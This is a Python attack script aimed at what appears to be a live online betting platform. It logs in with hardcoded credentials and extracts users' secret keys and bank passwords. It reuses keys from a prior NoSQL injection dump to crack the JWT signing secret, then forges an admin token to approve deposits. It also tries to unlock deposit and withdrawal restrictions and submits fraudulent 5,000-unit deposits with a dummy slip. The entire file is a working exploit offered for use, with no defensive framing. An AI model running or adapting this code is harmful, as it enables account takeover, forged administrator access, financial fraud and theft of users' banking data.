#!/usr/bin/env python3
"""probe_user_id.py — Extract secret_key + bank_password from user profile; crack JWT."""
import base64, hashlib, hmac as hmac_mod, json, pathlib, requests, time

TID   = "af6efb584a3d317b5a11ab6209b88e1b"
PBAPI = f"https://{TID}pbapi.asdgapicenterssdo.com"
MGAPI = f"https://{TID}mgapi.asdgapicenterssdo.com"
BGAPI = f"https://{TID}bgapi.asdgapicenterssdo.com"
DOMAIN = "m.vak88z2.com"
AWSALB = "vlgcaXeb8Y5xNYKM2FxLL82+YlWrbQtYzdzI4CkDyjczOBk7W/5leJij/OSavNc7HffQnEjrn0K2fJGcJQLuB8BHQVW73SdL7oLjWPM1CD+yrb05d7ZgOTSP6w+H"
USER_ID   = "eea830ab-b187-4f21-9b79-28e2773b2f6b"
WALLET_ID = "456bc6aa-1b2b-4bd7-a0a1-6af319f6e40e"
ADMIN_UUID = "5958356c-eb4e-4e07-a155-83e4382e3532"
KNOWN_DEP  = "99e7a448-7d3a-4aee-ae87-eff1e3763347"

JWT_FILE = pathlib.Path(".jwt.vak88z2")

def get_jwt():
    cached = JWT_FILE.read_text().strip() if JWT_FILE.exists() else ""
    if cached:
        p = json.loads(base64.urlsafe_b64decode(cached.split(".")[1] + "=="))
        if p.get("exp", 0) - time.time() > 300:
            return cached
    r = requests.post(f"{PBAPI}/pb/authentication",
        headers={"Content-Type":"application/json"},
        json={"strategy":"local","username":"0972571110","password":"Pwned2026!"},
        timeout=15)
    if r.status_code in (200,201):
        jwt = r.json()["accessToken"]
        JWT_FILE.write_text(jwt)
        return jwt
    raise RuntimeError(f"Auth failed: {r.status_code}")

JWT = get_jwt()
HDR = {"Authorization": f"Bearer {JWT}", "template": "vn",
       "Content-Type": "application/json", "Cookie": f"AWSALB={AWSALB}"}

def wallet():
    r = requests.get(f"{MGAPI}/mb/wallet", headers=HDR, timeout=10)
    return r.json().get("data", [{}])[0].get("balance","?") if r.ok else f"ERR:{r.status_code}"

print(f"wallet before: {wallet()}")

# ── 1. Extract secret_key and other sensitive fields ─────────────────────────
print("\n=== 1. User profile sensitive fields ===")
r = requests.get(f"{MGAPI}/mb/users", headers=HDR, timeout=10)
user = r.json().get("data", [{}])[0] if r.ok else {}
sensitive_fields = ["secret_key", "bank_password", "bank_no", "bank_currency_information_id",
                    "bank_branch_information_id", "identification_no", "upline_refcode"]
for k in sensitive_fields:
    if k in user:
        print(f"  {k} = {json.dumps(user[k])}")

# All payment accounts
print(f"\n  payment_accounts:")
for acct in user.get("payment_accounts", []):
    print(f"    {acct.get('bank_code')} | acct_id={acct.get('account_id','')[:8]} | bank_no={acct.get('bank_no')} | currency_id={acct.get('bank_currency_information_id','')[:8]}")

# ── 2. Try secret_key as JWT signing secret ────────────────────────────────────
print("\n=== 2. Crack JWT with secret_key ===")
secret_key_val = user.get("secret_key", "")
print(f"  secret_key value: {secret_key_val!r}")

def try_jwt_secret(jwt_str, secret, label):
    parts = jwt_str.split(".")
    if len(parts) != 3:
        return False
    msg = f"{parts[0]}.{parts[1]}".encode()
    pad = parts[2] + "=" * (-len(parts[2]) % 4)
    try:
        sig = base64.urlsafe_b64decode(pad)
    except Exception:
        return False
    for s in [secret, secret.encode().hex(), secret.lower(), secret.upper()]:
        if s and hmac_mod.new(s.encode() if isinstance(s,str) else s, msg, hashlib.sha256).digest() == sig:
            print(f"  [!!!] JWT signed with secret: {s!r}")
            return s
    return False

# Check all JWT files with secret_key
if secret_key_val:
    for f in sorted(pathlib.Path(".").glob(".jwt.*")):
        jwt_str = f.read_text().strip()
        if jwt_str and "." in jwt_str:
            result = try_jwt_secret(jwt_str, secret_key_val, f.name)
            if result:
                print(f"  MATCH on {f.name}!")

# ── 3. Pbapi secret_key from NoSQL injection results ──────────────────────────
print("\n=== 3. Provider secret_keys from NoSQL injection ===")
nosql_file = pathlib.Path("pbapi_latest_win.json")
if nosql_file.exists():
    data = json.loads(nosql_file.read_text())
    providers = data.get("data", []) if isinstance(data, dict) else []
    print(f"  {len(providers)} records")
    seen_keys = set()
    for rec in providers[:50]:
        sk = rec.get("secret_key","")
        if sk and sk not in seen_keys:
            seen_keys.add(sk)
            print(f"  secret_key={sk[:40]}")
            # Try as JWT secret
            for f in sorted(pathlib.Path(".").glob(".jwt.*")):
                jwt_str = f.read_text().strip()
                if jwt_str and "." in jwt_str:
                    result = try_jwt_secret(jwt_str, sk, f.name)
                    if result:
                        print(f"  [!!!] MATCH: {f.name} signed with provider key {sk[:20]}")

# ── 4. Forge BO JWT with any matching secret ─────────────────────────────────
def forge_and_test(secret):
    print(f"\n  Forging BO JWT with secret: {secret[:20]}...")
    header = base64.urlsafe_b64encode(b'{"alg":"HS256","typ":"JWT"}').rstrip(b"=").decode()
    now = int(time.time())
    payload = {"sub": ADMIN_UUID, "iat": now, "exp": now+14400,
               "role": "admin", "tid": TID, "domain": DOMAIN}
    payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()
    msg = f"{header}.{payload_b64}".encode()
    sig = base64.urlsafe_b64encode(hmac_mod.new(secret.encode(), msg, hashlib.sha256).digest()).rstrip(b"=").decode()
    bo_jwt = f"{header}.{payload_b64}.{sig}"
    bo_hdr = {**HDR, "Authorization": f"Bearer {bo_jwt}"}
    r = requests.get(f"{BGAPI}/bo/info/admin?domain={DOMAIN}", headers=bo_hdr, timeout=10)
    print(f"  bgapi /bo/info/admin: {r.status_code}: {r.text[:150]}")
    if r.status_code == 200:
        r2 = requests.get(f"{BGAPI}/bo/auto-deposit-assign-task?domain={DOMAIN}&skip=0&limit=5",
                          headers=bo_hdr, timeout=10)
        print(f"  deposit tasks: {r2.status_code}: {r2.text[:300]}")
        r3 = requests.post(f"{BGAPI}/bo/auto-deposit-assign-task/admin-do-task",
                           headers=bo_hdr,
                           json={"domain": DOMAIN, "action": "approve",
                                 "deposit_transaction_id": KNOWN_DEP},
                           timeout=10)
        print(f"  approve task: {r3.status_code}: {r3.text[:300]}")

# ── 5. Check lock_deposit flag and toggle ─────────────────────────────────────
print("\n=== 5. User lock flags ===")
print(f"  lock_deposit={user.get('lock_deposit')} lock_withdrawal={user.get('lock_withdrawal')}")
# Try PATCH to unlock
for endpoint in [f"/mb/users/{USER_ID}", "/mb/users/update-profile", "/mb/profile"]:
    r = requests.patch(f"{MGAPI}{endpoint}", headers=HDR,
                       json={"lock_deposit": False, "lock_withdrawal": False}, timeout=8)
    if r.status_code not in (404, 405):
        print(f"  [!!!] PATCH {endpoint}: {r.status_code}: {r.text[:200]}")
    else:
        print(f"  PATCH {endpoint}: {r.status_code}")

# ── 6. TRUEWALLET deposit ─────────────────────────────────────────────────────
print("\n=== 6. TrueWallet deposit ===")
# Get TRUEWALLET bank info
TW_DEP_ACCT = "bb2f7ca4-caa8-42a9-bd66-7503ff9dba33"  # from payment_accounts
TW_CURRENCY_ID = "a6e84d08-3b9c-4ad2-9914-b424f0fa96c9"
# Get sign URL
sr = requests.post(f"{MGAPI}/mb/sign-url-upload-slip", headers=HDR,
                   json={"filename":"slip_tw.png","content_type":"image/png","size":1024},
                   timeout=15)
slip_fn = sr.json().get("filename","slip_tw.png") if sr.ok else "slip_tw.png"

for method_path, payload in [
    ("/mb/auto-slip-deposit",
     {"payment_bank_information_id": "18a9502b-94ae-4188-8841-094be8b3b974",
      "deposit_amount": 5000, "deposit_account_id": TW_DEP_ACCT,
      "slip_image_url": slip_fn, "qr_string": ""}),
    ("/mb/truewallet-deposit",
     {"amount": 5000, "phone": "0972571110", "deposit_account_id": TW_DEP_ACCT}),
    ("/mb/promptpay-deposit",
     {"amount": 5000, "deposit_account_id": TW_DEP_ACCT}),
]:
    r = requests.post(f"{MGAPI}{method_path}", headers=HDR, json=payload, timeout=15)
    if r.status_code not in (404,):
        print(f"  [!!!] POST {method_path}: {r.status_code}: {r.text[:200]}")
    else:
        print(f"  POST {method_path}: 404")

time.sleep(3)
print(f"\nFINAL wallet: {wallet()}")
print("=== DONE ===")
